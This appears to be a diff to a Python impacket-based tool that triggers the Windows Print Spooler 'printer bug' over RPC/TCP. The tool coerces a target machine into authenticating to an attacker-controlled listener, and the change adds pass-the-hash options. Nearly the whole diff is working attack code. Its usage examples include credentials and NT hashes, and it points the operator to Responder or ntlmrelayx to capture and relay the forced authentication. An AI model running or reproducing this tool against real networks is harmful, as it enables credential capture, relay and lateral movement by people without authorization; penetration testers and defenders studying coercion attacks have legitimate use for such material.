@@ -5,57 +5,53 @@ Uses direct TCP/IP RPC transport (ncacn_ip_tcp) - the new default for spoolss
 Based on https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
 """
 
+import argparse
+import logging
+import sys
+
 from impacket.dcerpc.v5 import transport, rprn
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_CONNECT
 from impacket.dcerpc.v5.dtypes import NULL
-import logging
-import sys
 
-# Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
+
 class RpcTcpPrinterTrigger:
-    def __init__(self, target_host, username='', password='', domain='', remote_host=None, tcp_port=None):
+    def __init__(self, target_host, username='', password='', domain='',
+                 lmhash='', nthash='', listener=None, tcp_port=None):
         self.target_host = target_host
         self.username = username
         self.password = password
         self.domain = domain
-        self.remote_host = remote_host if remote_host else target_host
-        self.tcp_port = tcp_port  # Optional specific port, otherwise dynamic
+        self.lmhash = lmhash
+        self.nthash = nthash
+        self.listener = listener if listener else target_host
+        self.tcp_port = tcp_port
         
     def trigger_rpc_backconnect(self):
-        """
-        Trigger RPC backconnect using RPC over TCP (Windows 11/Server 2025 default)
-        """
         try:
-            # Build RPC over TCP connection string
             if self.tcp_port:
-                # Use specific port if provided
                 stringbinding = f'ncacn_ip_tcp:{self.target_host}[{self.tcp_port}]'
                 logging.info(f'Using specified port: {self.tcp_port}')
             else:
-                # Use dynamic port (will query endpoint mapper automatically)
                 stringbinding = f'ncacn_ip_tcp:{self.target_host}'
                 logging.info('Using dynamic port resolution via endpoint mapper')
-            
+
             logging.info(f'Connecting to {stringbinding}')
-            
-            # Create RPC transport
             rpctransport = transport.DCERPCTransportFactory(stringbinding)
-            
-            # Set credentials if provided
-            if self.username and self.password:
-                rpctransport.set_credentials(self.username, self.password, self.domain)
-                logging.info(f'Using credentials: {self.domain}\\{self.username}')
+
+            if self.username:
+                rpctransport.set_credentials(self.username, self.password, self.domain,
+                                             lmhash=self.lmhash, nthash=self.nthash)
+                auth_desc = f'(hash)' if self.nthash else f'(password)'
+                logging.info(f'Using credentials: {self.domain}\\{self.username} {auth_desc}')
             else:
                 logging.info('Using anonymous/null session')
-            
-            # Get DCE/RPC connection
+
             dce = rpctransport.get_dce_rpc()
-            
-            # Set authentication level on the DCE connection
-            if self.username and self.password:
+
+            if self.username:
                 dce.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
                 #dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
             
@@ -94,12 +90,12 @@ class RpcTcpPrinterTrigger:
             logging.info('Got printer handle successfully')
             #text = input("-hit enter-")   
             # Create notification request
-            logging.info(f'Creating change notification pointing to \\\\{self.remote_host}')
+            logging.info(f'Creating change notification pointing to \\\\{self.listener}')
             request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
             request['hPrinter'] = resp['pHandle']
             request['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
             
-            request['pszLocalMachine'] =  '\\\\%s\x00' % self.remote_host
+            request['pszLocalMachine'] =  '\\\\%s\x00' % self.listener
             request['pOptions'] = NULL
             
             # Send the request
@@ -110,7 +106,7 @@ class RpcTcpPrinterTrigger:
             except Exception as e:
                 logging.warning(f'RPC request exception (may be expected): {e}')
             
-            logging.info(f'[SUCCESS] Triggered RPC backconnect to \\\\{self.remote_host}')
+            logging.info(f'[SUCCESS] Triggered RPC backconnect to \\\\{self.listener}')
             logging.info('Check your listener/Responder for incoming authentication!')
             
             # Cleanup
@@ -131,69 +127,86 @@ class RpcTcpPrinterTrigger:
                 return False
 
 
-def print_banner():
-    print("=" * 70)
-    print("Pure RPC over TCP Printer Spooler Trigger")
-    print("For Windows 11 22H2+ / Windows Server 2025")
-    print("=" * 70)
+EXAMPLES = """\
+examples:
+  # anonymous
+  %(prog)s -t 10.10.11.50 -l 10.10.14.5
+
+  # cleartext credentials
+  %(prog)s -t 10.10.11.50 -u Administrator -p 'P@ssw0rd' -d CORP -l 10.10.14.5
+
+  # pass-the-hash (NT hash only)
+  %(prog)s -t 10.10.11.50 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d CORP -l 10.10.14.5
+
+  # specific RPC port (skip EPM lookup)
+  %(prog)s -t 10.10.11.50 -u svc -H aad3b435b51404eeaad3b435b51404ee -d CORP -l 10.10.14.5 --port 49152
+"""
 
 
 def main():
-    if len(sys.argv) < 2:
-        print_banner()
-        print(f"\nUsage: {sys.argv[0]} <target_host> [username] [password] [domain] [attacker_host] [tcp_port]")
-        print("\nExamples:")
-        print(f"  # Anonymous connection")
-        print(f"  {sys.argv[0]} 192.168.1.100")
-        print(f"\n  # With credentials")
-        print(f"  {sys.argv[0]} 192.168.1.100 admin Password123 DOMAIN")
-        print(f"\n  # Trigger backconnect to different host (attacker)")
-        print(f"  {sys.argv[0]} 192.168.1.100 admin Password123 DOMAIN 192.168.1.50")
-        print(f"\n  # Use specific RPC port")
-        print(f"  {sys.argv[0]} 192.168.1.100 admin Password123 DOMAIN 192.168.1.50 49152")
-        print("\nNotes:")
-        print("  - Target must be Windows 11 22H2+ or Server 2025 (RPC over TCP default)")
-        print("  - For older versions, spoolss uses RPC over Named Pipes (SMB)")
-        print("  - Ensure ports 135 and dynamic RPC ports (49152-65535) are open")
-        print("  - Start Responder or ntlmrelayx on remote_host to capture auth")
-        sys.exit(1)
-    
-    target_host = sys.argv[1]
-    username = sys.argv[2] if len(sys.argv) > 2 else ''
-    password = sys.argv[3] if len(sys.argv) > 3 else ''
-    domain = sys.argv[4] if len(sys.argv) > 4 else ''
-    remote_host = sys.argv[5] if len(sys.argv) > 5 else None
-    tcp_port = int(sys.argv[6]) if len(sys.argv) > 6 else None
-    
-    print_banner()
-    print(f"Target Host:  {target_host}")
-    print(f"Attacker Host:  {remote_host if remote_host else target_host}")
-    print(f"Credentials:  {domain}\\{username}" if username else "Credentials:  Anonymous")
-    print(f"TCP Port:     {tcp_port if tcp_port else 'Dynamic (via endpoint mapper)'}")
+    parser = argparse.ArgumentParser(
+        description='Print Spooler RPC/TCP trigger — Windows 11 22H2+ / Server 2025',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=EXAMPLES,
+    )
+    parser.add_argument('-t', '--target', required=True,
+                        help='target IP or hostname')
+    parser.add_argument('-u', '--username', default='',
+                        help='username')
+    parser.add_argument('-p', '--password', default='',
+                        help='plaintext password')
+    parser.add_argument('-H', '--hashes', metavar='NTHASH', default=None,
+                        help='NT hash for pass-the-hash (32 hex chars)')
+    parser.add_argument('-d', '--domain', default='',
+                        help='domain')
+    parser.add_argument('-l', '--listener', default=None,
+                        help='listener IP/host for backconnect (default: TARGET)')
+    parser.add_argument('--port', type=int, default=None,
+                        help='specific spoolss RPC/TCP port (omit to query EPM)')
+    args = parser.parse_args()
+
+    nthash = args.hashes or ''
+    lmhash = ''
+
+    print("=" * 70)
+    print("Print Spooler RPC/TCP Trigger  —  Windows 11 22H2+ / Server 2025")
+    print("=" * 70)
+    listener = args.listener or args.target
+    print(f"Target:    {args.target}")
+    print(f"Listener:  {listener}")
+    if args.username:
+        auth = f"{args.domain}\\{args.username}" if args.domain else args.username
+        auth += " (hash)" if nthash else " (password)"
+        print(f"Auth:      {auth}")
+    else:
+        print("Auth:      anonymous")
+    print(f"Port:      {args.port if args.port else 'dynamic (EPM)'}")
     print("=" * 70)
     print()
-    
+
     trigger = RpcTcpPrinterTrigger(
-        target_host=target_host,
-        username=username,
-        password=password,
-        domain=domain,
-        remote_host=remote_host,
-        tcp_port=tcp_port
+        target_host=args.target,
+        username=args.username,
+        password=args.password,
+        domain=args.domain,
+        lmhash=lmhash,
+        nthash=nthash,
+        listener=args.listener,
+        tcp_port=args.port,
     )
-    
+
     success = trigger.trigger_rpc_backconnect()
-    
+
     print()
     if success:
         print("[+] Operation completed successfully!")
         print("[+] Check your listener for incoming authentication from target")
     else:
-        print("[-] Operation failed - see error messages above")
+        print("[-] Operation failed — see error messages above")
         print("\nTroubleshooting:")
         print("  1. Ensure target is Windows 11 22H2+ or Server 2025")
-        print("  2. Check firewall allows RPC (port 135 + dynamic ports)")
-        print("  3. Verify Print Spooler service is running")
+        print("  2. Check firewall allows RPC (port 135 + dynamic ports 49152-65535)")
+        print("  3. Verify Print Spooler service is running on the target")
         print("  4. For older Windows, spoolss uses Named Pipes (not TCP)")
         sys.exit(1)
 
